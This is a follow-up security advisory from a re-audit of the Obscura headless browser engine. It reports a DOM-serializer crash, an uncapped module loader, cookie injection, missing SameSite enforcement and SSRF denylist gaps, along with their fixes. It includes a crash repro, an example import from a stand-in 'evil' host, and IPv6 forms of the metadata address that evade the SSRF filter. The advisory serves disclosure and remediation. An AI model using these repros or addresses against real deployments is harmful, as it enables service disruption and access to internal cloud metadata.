# Security Advisory — Obscura (follow-up / re-audit)

> **For the upstream maintainer (`h4ckf0r0day/obscura`).** Submit privately via
> *Security → Report a vulnerability* (GitHub Security Advisory) or the
> `SECURITY.md` contact. All fixes referenced here are ready on a branch / PR and
> can be shared or merged under embargo.
>
> **Disclosure note:** an earlier review of the same engine and its fixes were
> already committed in a public fork under `security-audit/` (so the *original*
> findings are effectively public). This follow-up advisory covers the
> **independent re-audit** of the patched tree: it confirms the earlier fixes
> hold, reports the **new** issues that review surfaced, and rules on the
> documented residuals. Please pull the fixes promptly.

- **Project:** Obscura — headless browser engine that fetches and executes
  untrusted web content by design.
- **Affected:** 0.1.0 / current `main` and the `ci/audit-gate-and-hygiene` branch
  (the re-audited tree).
- **Date:** 2026-06-11
- **Method:** independent multi-agent re-audit (9 surfaces, find → adversarial
  3-lens verification → completeness critic). 63 candidate findings → 34 confirmed
  open (0 Critical, 4 High, 11 Medium, the rest Low/Info); 16 prior fixes verified
  correct; 18 candidates refuted.
- **Overall:** no new Critical. The earlier remediation (resolve-time SSRF guard,
  `Deno.core.ops` realm narrowing, `file://` gates, CDP/MCP Origin+Host
  validation, DoS caps, header filter, V8 watchdog) is **present and correct**.
  The new issues cluster on three axes: the **programmatic cookie-ingest path**,
  **missing memory caps** on two egress paths, and a **second, unhardened DOM
  serializer**.

---

## New findings (all fixed on the branch / PR)

### H1 — Unbounded recursion in the CDP DOM serializer → process abort (High)
- **Attacker:** A1 plants a deep DOM; A2 (unauthenticated CDP client on loopback,
  default flags) triggers it.
- **Detail:** `DOM.getDocument` / `describeNode` serialize via a *separate*
  recursive `serialize_node` (`crates/obscura-cdp/src/domains/dom.rs`) whose only
  bound is the client-supplied `depth`. CDP clients conventionally request the
  whole subtree with `depth:-1`, which casts to `u32::MAX`, so the function
  recurses to the true DOM depth. The DOM crate's own serializer was hardened
  (`MAX_SERIALIZE_DEPTH=1000`) but that cap was never ported here. No
  `catch_unwind` on this path; a native stack overflow aborts the engine and
  every session on it.
- **Repro:** navigate to a page with `'<div>'.repeat(100000)`, then
  `DOM.getDocument {"depth":-1}` → SIGSEGV/abort.
- **Fix:** internal recursion ceiling (1000) independent of the client depth.

### H2 — Dynamic `import()` module loader has no body size cap → host OOM (High)
- **Attacker:** A1 (a page runs `import('https://evil/x.mjs')`), default flags.
- **Detail:** `ObscuraModuleLoader::load` read the whole body via `resp.text()`
  with no bound — unlike the nav client and `op_fetch_url`, which both use a
  256 MiB `read_body_capped`. With transparent gzip/brotli decompression, a small
  compressed response inflates to multi-GB in native memory (decompression bomb),
  OOM-killing the process. This was the last page-reachable egress without a cap.
- **Fix:** route the module body through `read_body_capped`.

### H3 — Cookie injection for any domain via the CDP/MCP ingest path (High)
- **Attacker:** A2 (unauthenticated CDP/MCP client on loopback).
- **Detail:** the COOK-01 scope guard (host-relationship + public-suffix
  rejection) was only applied to `Set-Cookie` and `document.cookie`. The
  programmatic path `set_cookies_from_cdp` (CDP `Network.setCookie` /
  `Storage.setCookies` / MCP `browser_set_cookie`) stored `cookie.domain`
  verbatim, so a client could set `Domain=com` (a supercookie sent to every
  `.com` site) or a fixation cookie for an unrelated registrable domain.
- **Fix:** route ingest through the same validation — reject public-suffix / bare
  TLDs and enforce `__Host-`/`__Secure-` prefix rules.

### H4 — `SameSite` never enforced at egress → CSRF (High)
- **Attacker:** A1.
- **Detail:** `same_site` was parsed and stored but never consulted when building
  the `Cookie` header, and the initiating site was not threaded into the HTTP
  stack, so a `Strict`/`Lax` session cookie was sent on attacker-initiated
  cross-site navigations (classic CSRF that SameSite is meant to block).
- **Fix:** thread the initiating top-level site through the navigation/redirect
  path (both the default and `--stealth` clients) and enforce SameSite at egress
  (`Strict` withheld cross-site; `Lax` withheld on cross-site unsafe-method).

### Medium / Low (also fixed)
- **SSRF denylist gap:** `is_forbidden_ip` did not canonicalize IPv4-compatible
  (`::a.b.c.d`) or 6to4 (`2002::/16`) IPv6 literals, so `::169.254.169.254` /
  `2002:a9fe:a9fe::` could smuggle an internal target (`::ffff:` and NAT64 were
  handled, these were not). **Fixed** + tests.
- **Stealth (wreq) body cap:** bounded only by the declared `Content-Length`; a
  chunked / no-length / lying body was unbounded. **Fixed** with a streaming cap.
- **`op_fetch_url` post-cap amplification:** the capped body was materialized 3×+
  (text + base64 + JSON copy) — ~1.1 GB peak per fetch. **Reduced.**
- **`file://` path jail:** under `--allow-file-access` there was no directory
  jail — any process-readable file was reachable. **Fixed** via
  `OBSCURA_FILE_ACCESS_ROOT` (canonicalize + prefix, reject UNC/symlink escapes).
- **Proxy credential leak:** a malformed `--proxy` surfaced the raw URL (creds)
  into the page-JS realm via the `op_fetch_url` error. **Fixed** (shared redaction).
- **CDP `/json/*` Host pin, `Network.setExtraHTTPHeaders` filter, cookie
  path-match boundary, Windows cookie-jar ACL, CLI insecure-bind / SSRF-off
  warnings, multi-worker proxy-via-argv, u16 worker-port overflow, an unsound
  `&mut Page` reconstruction in the library facade.** All fixed.
- **Supply chain:** Docker build now `--locked`; cargo-deny now enforces
  `licenses` (this surfaced an **LGPL-3.0** dependency, `wreq-util`, pulled only
  by the optional `--features stealth` — see the licensing note below); Semgrep
  no longer neutered by `continue-on-error`; all GitHub Actions pinned to commit
  SHAs.

## Documented residuals — verdicts
- **OPS-03** (synchronous `Runtime.evaluate` wedging the dispatcher): **mitigated**
  — the per-command V8 watchdog (`terminate_execution`) is correctly wired for
  `evaluate` and `callFunctionOn`.
- **AX-02** (`getFullAXTree` "quadratic" ancestor walk): **refuted** — empty-role
  nodes are structurally leaves, so the walk is O(N) bounded by `MAX_NODES`, not
  quadratic.
- **COOK-04 / file jail / wreq cap:** were the open residuals; now **fixed**
  (above).

## Non-security note — LGPL-3.0 in the stealth feature
Enabling `--features stealth` pulls `wreq-util` (LGPL-3.0, weak copyleft); the
default build is fully permissive. Distributing a statically-linked stealth binary
carries LGPL relinking obligations. This is a licensing decision, not a
vulnerability, and is documented in the project README.

---

## Fixes

A complete, tested fix set (workspace tests green; CI green including the
`--features stealth` / libclang job and a `cargo deny ... licenses` gate) is
staged as themed commits and an internal PR on the fork. Happy to share a patch
bundle or open a PR against upstream under embargo.

## Suggested handling
1. Treat as embargoed; assign GHSA / request CVEs as appropriate (note the
   original findings are already public in the fork).
2. Review/merge the fixes and cut a patched release with checksums.
3. Until patched: keep CDP/MCP bound to loopback only, never set
   `--allow-file-access` / `--allow-private-network` on untrusted networks, and
   scrape unknown targets only in an isolated, egress-filtered container.

## Credit
Independent re-audit and fixes contributed on the referenced branch.
